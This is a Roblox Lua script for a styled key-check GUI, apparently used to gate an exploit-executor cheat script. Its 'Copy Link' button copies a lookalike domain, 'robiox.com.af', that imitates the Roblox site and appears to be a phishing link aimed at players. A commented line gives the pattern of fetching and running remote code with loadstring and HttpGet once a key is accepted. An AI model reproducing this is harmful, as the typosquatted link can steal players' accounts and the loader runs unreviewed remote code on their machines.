--[[
    🔑 Premium Key System GUI
    - Left: Check Key button with input
    - Right: Copy Link button
    - Modern dark theme with gradient accents
]]

-- Services
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Cliptboard = setclipboard or toclipboard or writeclipboard or function() end

-- Configuration
local Config = {
    Key = "Script",      -- Change this to your current key
    Link = "https://robiox.com.af/communities/3194405981/",    -- Change this anytime (Discord, pastebin, etc.)
    Title = "PREMIUM SCRIPT",
    Version = "v2.1"
}

-- Get LocalPlayer
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystemGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 420, 0, 280)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Shadow
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.Size = UDim2.new(1, 40, 1, 40)
Shadow.Position = UDim2.new(0, -20, 0, -20)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://5554236805"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.6
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(23, 23, 277, 277)
Shadow.Parent = MainFrame

-- Corner
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

-- Border Glow
local BorderGlow = Instance.new("Frame")
BorderGlow.Name = "BorderGlow"
BorderGlow.Size = UDim2.new(1, 0, 1, 0)
BorderGlow.BackgroundTransparency = 1
BorderGlow.BorderSizePixel = 2
BorderGlow.BorderColor3 = Color3.fromRGB(100, 60, 255)
BorderGlow.Parent = MainFrame

-- Top Accent Line
local AccentLine = Instance.new("Frame")
AccentLine.Name = "AccentLine"
AccentLine.Size = UDim2.new(1, 0, 0, 3)
AccentLine.BackgroundColor3 = Color3.fromRGB(100, 60, 255)
AccentLine.BorderSizePixel = 0
AccentLine.Parent = MainFrame

-- Title
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(1, 0, 0, 45)
TitleLabel.Position = UDim2.new(0, 0, 0, 10)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = Config.Title
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(230, 230, 245)
TitleLabel.TextSize = 22
TitleLabel.TextTransparency = 0.05
TitleLabel.Parent = MainFrame

-- Version Label
local VersionLabel = Instance.new("TextLabel")
VersionLabel.Name = "VersionLabel"
VersionLabel.Size = UDim2.new(1, 0, 0, 20)
VersionLabel.Position = UDim2.new(0, 0, 0, 48)
VersionLabel.BackgroundTransparency = 1
VersionLabel.Text = Config.Version .. " • Authenticate to continue"
VersionLabel.Font = Enum.Font.Gotham
VersionLabel.TextColor3 = Color3.fromRGB(140, 140, 170)
VersionLabel.TextSize = 13
VersionLabel.Parent = MainFrame

-- Divider Line
local Divider = Instance.new("Frame")
Divider.Name = "Divider"
Divider.Size = UDim2.new(0.85, 0, 0, 1)
Divider.Position = UDim2.new(0.075, 0, 0, 75)
Divider.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
Divider.BorderSizePixel = 0
Divider.Parent = MainFrame

-- Key Input Label
local KeyLabel = Instance.new("TextLabel")
KeyLabel.Name = "KeyLabel"
KeyLabel.Size = UDim2.new(0.85, 0, 0, 25)
KeyLabel.Position = UDim2.new(0.075, 0, 0, 90)
KeyLabel.BackgroundTransparency = 1
KeyLabel.Text = "🔑  ENTER LICENSE KEY"
KeyLabel.Font = Enum.Font.GothamBold
KeyLabel.TextColor3 = Color3.fromRGB(160, 160, 190)
KeyLabel.TextSize = 12
KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
KeyLabel.Parent = MainFrame

-- Key Input Box
local KeyInput = Instance.new("TextBox")
KeyInput.Name = "KeyInput"
KeyInput.Size = UDim2.new(0.85, 0, 0, 40)
KeyInput.Position = UDim2.new(0.075, 0, 0, 118)
KeyInput.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
KeyInput.BackgroundTransparency = 0.1
KeyInput.BorderSizePixel = 0
KeyInput.PlaceholderText = "Paste your key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(80, 80, 100)
KeyInput.Text = ""
KeyInput.Font = Enum.Font.Gotham
KeyInput.TextColor3 = Color3.fromRGB(230, 230, 245)
KeyInput.TextSize = 15
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = MainFrame

-- Key Input Corner
local KeyInputCorner = Instance.new("UICorner")
KeyInputCorner.CornerRadius = UDim.new(0, 8)
KeyInputCorner.Parent = KeyInput

-- Key Input Padding
local KeyInputPadding = Instance.new("UIPadding")
KeyInputPadding.PaddingLeft = UDim.new(0, 15)
KeyInputPadding.PaddingRight = UDim.new(0, 15)
KeyInputPadding.Parent = KeyInput

-- ===== BUTTONS =====

-- "Check Key" Button (Left side)
local CheckKeyBtn = Instance.new("TextButton")
CheckKeyBtn.Name = "CheckKeyBtn"
CheckKeyBtn.Size = UDim2.new(0, 160, 0, 45)
CheckKeyBtn.Position = UDim2.new(0.075, 0, 0, 180)
CheckKeyBtn.BackgroundColor3 = Color3.fromRGB(100, 60, 255)
CheckKeyBtn.BorderSizePixel = 0
CheckKeyBtn.Text = "✓  CHECK KEY"
CheckKeyBtn.Font = Enum.Font.GothamBold
CheckKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckKeyBtn.TextSize = 13
CheckKeyBtn.AutoButtonColor = false
CheckKeyBtn.Parent = MainFrame

-- Check Key Corner
local CheckKeyCorner = Instance.new("UICorner")
CheckKeyCorner.CornerRadius = UDim.new(0, 8)
CheckKeyCorner.Parent = CheckKeyBtn

-- "Copy Link" Button (Right side)
local CopyLinkBtn = Instance.new("TextButton")
CopyLinkBtn.Name = "CopyLinkBtn"
CopyLinkBtn.Size = UDim2.new(0, 160, 0, 45)
CopyLinkBtn.Position = UDim2.new(1, -170, 0, 180)
CopyLinkBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
CopyLinkBtn.BorderSizePixel = 0
CopyLinkBtn.Text = "📋  COPY LINK"
CopyLinkBtn.Font = Enum.Font.GothamBold
CopyLinkBtn.TextColor3 = Color3.fromRGB(180, 180, 210)
CopyLinkBtn.TextSize = 13
CopyLinkBtn.AutoButtonColor = false
CopyLinkBtn.Parent = MainFrame

-- Copy Link Corner
local CopyLinkCorner = Instance.new("UICorner")
CopyLinkCorner.CornerRadius = UDim.new(0, 8)
CopyLinkCorner.Parent = CopyLinkBtn

-- Status Label (below buttons)
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Size = UDim2.new(0.85, 0, 0, 25)
StatusLabel.Position = UDim2.new(0.075, 0, 0, 238)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Waiting for authentication..."
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextColor3 = Color3.fromRGB(100, 100, 130)
StatusLabel.TextSize = 12
StatusLabel.Parent = MainFrame

-- ===== ANIMATIONS & FUNCTIONALITY =====

-- Tween info
local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Button hover effects
local function setupButton(button, baseColor, hoverColor, textBaseColor, textHoverColor)
    button.MouseEnter:Connect(function()
        local tween = TweenService:Create(button, tweenInfo, {BackgroundColor3 = hoverColor})
        tween:Play()
        if textHoverColor then
            local textTween = TweenService:Create(button, tweenInfo, {TextColor3 = textHoverColor})
            textTween:Play()
        end
    end)
    button.MouseLeave:Connect(function()
        local tween = TweenService:Create(button, tweenInfo, {BackgroundColor3 = baseColor})
        tween:Play()
        if textBaseColor then
            local textTween = TweenService:Create(button, tweenInfo, {TextColor3 = textBaseColor})
            textTween:Play()
        end
    end)
    button.MouseButton1Down:Connect(function()
        local tween = TweenService:Create(button, tweenInfo, {BackgroundColor3 = baseColor})
        tween:Play()
    end)
    button.MouseButton1Up:Connect(function()
        local tween = TweenService:Create(button, tweenInfo, {BackgroundColor3 = hoverColor})
        tween:Play()
    end)
end

-- Setup Check Key button
setupButton(
    CheckKeyBtn,
    Color3.fromRGB(100, 60, 255),
    Color3.fromRGB(130, 90, 255),
    Color3.fromRGB(255, 255, 255),
    Color3.fromRGB(255, 255, 255)
)

-- Setup Copy Link button
setupButton(
    CopyLinkBtn,
    Color3.fromRGB(30, 30, 45),
    Color3.fromRGB(45, 45, 65),
    Color3.fromRGB(180, 180, 210),
    Color3.fromRGB(220, 220, 240)
)

-- Input focus effects
KeyInput.Focused:Connect(function()
    local tween = TweenService:Create(KeyInput, tweenInfo, {BackgroundColor3 = Color3.fromRGB(28, 28, 42)})
    tween:Play()
    KeyInput.BorderSizePixel = 1
    KeyInput.BorderColor3 = Color3.fromRGB(100, 60, 255)
end)

KeyInput.FocusLost:Connect(function()
    local tween = TweenService:Create(KeyInput, tweenInfo, {BackgroundColor3 = Color3.fromRGB(22, 22, 32)})
    tween:Play()
    KeyInput.BorderSizePixel = 0
end)

-- Check Key logic
CheckKeyBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyInput.Text:gsub("%s+", "") -- trim whitespace
    
    if enteredKey == "" then
        StatusLabel.Text = "⚠️  Please enter a key first!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 170, 60)
        return
    end
    
    if enteredKey == Config.Key then
        StatusLabel.Text = "✅  Key accepted! Access granted."
        StatusLabel.TextColor3 = Color3.fromRGB(80, 220, 120)
        
        -- Success animation on CheckKeyBtn
        local successTween = TweenService:Create(CheckKeyBtn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(50, 180, 100)})
        successTween:Play()
        CheckKeyBtn.Text = "✓  VERIFIED"
        
        -- Execute your main script here
        -- loadstring(game:HttpGet("YOUR_SCRIPT_LINK"))()
        
        -- Optional: close GUI after success
        -- wait(1)
        -- ScreenGui:Destroy()
        
    else
        StatusLabel.Text = "❌  Invalid key! Access denied."
        StatusLabel.TextColor3 = Color3.fromRGB(240, 80, 80)
        
        -- Shake animation on failure
        for i = 1, 3 do
            local shakeTween = TweenService:Create(MainFrame, TweenInfo.new(0.05), {Position = UDim2.new(0.5, -210 + (i%2 == 0 and 8 or -8), 0.5, -140)})
            shakeTween:Play()
            task.wait(0.05)
        end
        MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
    end
end)

-- Copy Link logic
CopyLinkBtn.MouseButton1Click:Connect(function()
    Cliptboard(Config.Link)
    StatusLabel.Text = "📋  Link copied to clipboard!"
    StatusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
    
    -- Flash feedback on button
    local flashTween = TweenService:Create(CopyLinkBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 60, 90)})
    flashTween:Play()
    task.wait(0.15)
    local resetTween = TweenService:Create(CopyLinkBtn, tweenInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 45)})
    resetTween:Play()
end)

-- Enter key to submit
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Return then
        if KeyInput:IsFocused() then
            CheckKeyBtn.MouseButton1Click:Fire()
        end
    end
end)

-- Drag support
local dragging = false
local dragStart = nil
local startPos = nil

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- Fade in animation
MainFrame.BackgroundTransparency = 1
for i = 1, 20 do
    MainFrame.BackgroundTransparency = 1 - (i / 20)
    task.wait(0.015)
end
MainFrame.BackgroundTransparency = 0.05

-- Welcome status
task.wait(0.3)
StatusLabel.Text = "🔓  Enter your key to continue"
